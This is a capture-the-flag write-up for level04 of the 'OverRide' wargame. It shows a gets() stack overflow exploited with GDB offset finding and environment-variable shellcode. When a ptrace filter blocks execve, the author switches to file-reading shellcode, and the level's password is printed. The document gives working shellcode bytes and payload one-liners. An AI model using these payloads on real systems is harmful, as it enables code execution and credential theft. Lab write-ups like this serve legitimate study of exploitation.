At this level, we will exploit the 'gets' function, which is not protected.

```c
gets(&var_a0);
```

So, the goal is to find the offset, then add our shellcode to an environment variable, and retrieve the address of the environment variable.

Let's use GDB with the 'set follow-fork-mode child' mode to trace the child.
Using a pattern generator, let's find the offset.

```
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04
[New process 1819]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1819]
0x41326641 in ?? ()
```

0x41326641 = 156

Now, let's add our shellcode to an environment variable and retrieve its address.

```
export EXPLOIT=$(python -c 'print("\x90" * 200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

```
Breakpoint 1, 0x080486cd in main ()
(gdb) x/200s environ
...
0xffffd808:	  "EXPLOIT=\220..."
...
```

```
(gdb) x/50x 0xffffd808
0xffffd808:	 0x45	0x58	0x50	0x4c	0x4f	0x49	0x54	0x3d
0xffffd810:	 0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd818:	 0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd820:	 0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd828:	 0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd830:	 0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd838:	 0x90	0x90
```

```
level04@OverRide:~$ python -c 'print("A"*156 + "\x30\xd8\xff\xff")' | ./level04
Give me some shellcode, k
no exec() for you <--------------- NOOOOOOOOOOOOOOOOOOOOOOOOO
```

```c
if (ptrace(PTRACE_PEEKUSER, eax, 0x2c, 0) == 0xb) {
	{
		puts("no exec() for you");
		kill(eax, 9);
		break;
	}
	continue;
}
```

we are not allowed to use 0xb, which corresponds to the 'execve' syscall.
We don't have to launch a shell, we can simply use a shellcode that reads the file /home/user/level05/.pass and returns its contents.

Here is the shellcode that does that -> https://shell-storm.org/shellcode/files/shellcode-73.html

Now, we just need to modify the environment variable, find the address...

```
export EXPLOIT=$(python -c 'print("\x90" * 200 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass")')
```

```
level04@OverRide:~$ python -c 'print("A"*156 + "\xd3\xd7\xff\xff")' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```
